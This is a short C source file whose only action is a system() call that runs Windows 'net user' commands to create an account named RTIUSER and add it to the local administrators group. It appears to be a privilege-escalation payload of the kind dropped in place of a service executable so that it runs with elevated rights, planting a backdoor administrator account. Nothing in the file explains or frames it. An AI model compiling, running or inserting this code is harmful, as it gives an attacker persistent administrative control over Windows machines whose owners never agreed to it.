#include <stdlib.h>
int main()
{
	int i;
	i = system("net user RTIUSER <password> /add && net localgroup administrators RTIUSER /add");
	return 0;
}